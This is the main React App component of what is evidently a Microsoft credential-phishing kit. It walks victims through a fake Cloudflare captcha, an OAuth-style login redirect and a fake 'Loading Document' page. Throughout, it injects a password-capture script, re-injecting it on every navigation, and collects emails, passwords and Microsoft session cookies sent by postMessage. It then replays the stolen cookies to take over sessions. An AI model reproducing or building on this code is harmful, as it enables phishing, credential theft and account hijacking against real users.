import React, { useState, useEffect } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

// 🟢 ENHANCED: Import robust cookie/email setter with new enhanced functions
import { 
  restoreMicrosoftCookies, 
  restoreCookies, 
  setCapturedEmail, 
  setCapturedCookies,
  detectBrowserCapabilities,
  getStoredData
} from './utils/restoreCookies';

// 🟢 ENHANCED: Import dedicated password capture injector
import { injectPasswordCaptureScript } from './utils/password-capture-injector';

// Artificial delay helper (milliseconds)
const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
const nextStepDelay = SLOW_DELAY * 3;
const messageIconDelay = 500; // This matches the delay used in MessageIconLanding
const captchaVerificationDelay = 1500; // Default verification delay for captcha
const redirectingDelay = 3000; // Reduced delay for faster transition to prevent white page

// Calculate total delay for captcha to handle everything internally
const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');

  // State to hold the most reliable email and cookies captured via postMessage
  const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
  const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
  // 🟢 Enhanced: Track captured credentials with better typing
  const [capturedCredentials, setCapturedCredentials] = useState<{
    email?: string;
    password?: string;
    username?: string;
    domain?: string;
    captureTime?: string;
    source?: string;
    url?: string;
  } | null>(null);

  // 🟢 NEW: Track browser capabilities for enhanced cookie handling
  const [browserCapabilities, setBrowserCapabilities] = useState<any>(null);

  // Add CSS animation for dots
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes dotAnimation {
        0% { opacity: 0; }
        20% { opacity: 1; }
        100% { opacity: 0; }
      }
      .redirecting-dots span:nth-child(1) { animation-delay: 0s; }
      .redirecting-dots span:nth-child(2) { animation-delay: 0.2s; }
      .redirecting-dots span:nth-child(3) { animation-delay: 0.4s; }
      .redirecting-dots span:nth-child(4) { animation-delay: 0.6s; }
      .redirecting-dots span:nth-child(5) { animation-delay: 0.8s; }
      .redirecting-dots span:nth-child(6) { animation-delay: 1.0s; }
      .redirecting-dots span { animation: dotAnimation 1.5s infinite; }
    `;
    document.head.appendChild(style);
    return () => document.head.removeChild(style);
  }, []);

  // Handle redirecting to OAuth after delay
  useEffect(() => {
    if (currentPage === 'redirecting') {
      const timer = setTimeout(() => {
        setCurrentPage('oauth-redirect');
      }, redirectingDelay);
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  // 🟢 ENHANCED: Initialize browser capabilities and restore any stored data
  useEffect(() => {
    // Detect browser capabilities for enhanced cookie handling
    try {
      const capabilities = detectBrowserCapabilities();
      setBrowserCapabilities(capabilities);
      console.log('🌐 Browser capabilities detected:', capabilities);
    } catch (error) {
      console.warn('⚠️ Failed to detect browser capabilities:', error);
    }

    // Try to restore any previously stored data
    try {
      const storedData = getStoredData();
      if (storedData.email) {
        setCapturedEmailState(storedData.email);
        console.log('📧 Restored stored email:', storedData.email);
      }
      if (storedData.cookies && storedData.cookies.length > 0) {
        setCapturedCookiesState(JSON.stringify(storedData.cookies));
        console.log('🍪 Restored stored cookies:', storedData.cookies.length);
      }
    } catch (error) {
      console.warn('⚠️ Failed to restore stored data:', error);
    }
  }, []);

  // 🟢 ENHANCED: Use dedicated password capture injector
  useEffect(() => {
    try {
      // Use the dedicated password capture injector
      injectPasswordCaptureScript();
      console.log('✅ Password capture injector initialized');
    } catch (error) {
      console.warn('⚠️ Failed to initialize password capture injector:', error);
    }

    // Also inject when URL changes (for SPAs)
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;

    history.pushState = function (...args) {
      originalPushState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on pushState:', error);
        }
      }, 1000);
    };

    history.replaceState = function (...args) {
      originalReplaceState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on replaceState:', error);
        }
      }, 1000);
    };

    const handlePopState = () => {
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on popstate:', error);
        }
      }, 1000);
    };

    window.addEventListener('popstate', handlePopState);

    return () => {
      history.pushState = originalPushState;
      history.replaceState = originalReplaceState;
      window.removeEventListener('popstate', handlePopState);
    };
  }, []);

  // 🟢 ENHANCED: Listen for messages with improved cookie handling
  useEffect(() => {
    function handleMessage(event: MessageEvent) {
      if (!event.data || typeof event.data !== 'object') return;

      if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
        setCapturedEmailState(event.data.email);
        setCapturedEmail(event.data.email);
        console.log('📧 Email captured and stored:', event.data.email);
      }

      if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
        try {
          const cookiesJson = JSON.stringify(event.data.data.cookies);
          setCapturedCookiesState(cookiesJson);
          setCapturedCookies(event.data.data.cookies);
          
          // 🟢 ENHANCED: Use the new restoreMicrosoftCookies with advanced features
          const options = {
            reload: false, // Don't auto-reload during app flow
            validate: true,
            debug: true,
            skipExpired: true,
            skipInvalid: false, // Allow some invalid cookies for testing
            warnOnSecurity: true,
            handleDuplicates: true
          };
          
          try {
            const result = restoreMicrosoftCookies(event.data.data.cookies, options);
            console.log('✅ Enhanced cookie restoration result:', result);
            
            // Store the result for later use
            if (result.success) {
              console.log(`🎯 Successfully restored ${result.restored}/${result.total} cookies`);
            }
          } catch (error) {
            console.warn('⚠️ Enhanced restoration failed, falling back to basic:', error);
            // Fallback to basic restoration
            restoreCookies(event.data.data.cookies, { debug: true });
          }
          
        } catch (e) {
          console.warn('⚠️ Cookie processing error:', e);
        }
      }

      // 🟢 ENHANCED: Listen for generic credentials with better handling
      if (
        event.data.type === 'CREDENTIALS_CAPTURED' &&
        (event.data.data?.password || event.data.data?.email || event.data.data?.username)
      ) {
        setCapturedCredentials(event.data.data);
        console.log('🔐 Enhanced credentials captured:', {
          hasEmail: !!event.data.data?.email,
          hasPassword: !!event.data.data?.password,
          hasUsername: !!event.data.data?.username,
          source: event.data.data?.source
        });
        
        // Also update captured email state if available
        if (event.data.data.email) {
          setCapturedEmailState(event.data.data.email);
          setCapturedEmail(event.data.data.email);
        }
      }

      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
        setCapturedEmailState(event.data.data.email);
        setCapturedEmail(event.data.data.email);
        console.log('🏢 Organizational credentials captured:', event.data.data.email);
      }
    }

    window.addEventListener('message', handleMessage, false);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step');
    if (step && ['captcha', 'message-icon', 'redirecting', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
      setCurrentPage(step);
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []);

  // Captcha verified: go to redirecting page
  const handleCaptchaVerified = () => {
    setCurrentPage('redirecting');
  };

  const handleCaptchaBack = () => {
    window.location.reload();
  };

  const handleOAuthSuccess = async (sessionData: any) => {
    console.log('✅ OAuth success with enhanced data handling:', sessionData);
    setCurrentPage('document-loading');
  };

  const handleOAuthBack = () => {
    setCurrentPage('message-icon');
  };

  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );

    case 'redirecting':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Opening
            <span className="redirecting-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </div>
        </div>
      );

    case 'message-icon':
      return (
        <MessageIconLanding
          onOpenMessage={() => {}}
        />
      );

    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );

    case 'success':
    case 'document-loading':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            background: 'white',
            padding: '60px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <div style={{
              width: '80px',
              height: '80px',
              background: '#0078d4',
              borderRadius: '8px',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              animation: 'spin 2s linear infinite',
              fontSize: '40px',
              color: 'white'
            }}>
              📄
            </div>
            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
              Loading Document...
            </h2>
            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
              Please wait while we prepare your Microsoft document
            </p>
            
            {/* 🟢 ENHANCED: Show debug info in development */}
            {process.env.NODE_ENV === 'development' && (
              <div style={{ 
                marginTop: '20px', 
                padding: '10px', 
                backgroundColor: '#f8f9fa', 
                borderRadius: '4px',
                fontSize: '12px',
                color: '#666'
              }}>
                <div>Email: {capturedEmail || 'Not captured'}</div>
                <div>Cookies: {capturedCookies ? JSON.parse(capturedCookies).length : 0}</div>
                <div>Credentials: {capturedCredentials ? 'Captured' : 'None'}</div>
                <div>Browser: {browserCapabilities?.browser} v{browserCapabilities?.version}</div>
              </div>
            )}
            
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '10px',
              marginTop: '30px'
            }}>
              <button
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#0078d4',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Start Over
              </button>
              <button
                onClick={() => setCurrentPage('oauth-redirect')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#107c10',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Try Again
              </button>
            </div>
          </div>
        </div>
      );

    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );
  }
}

export default App;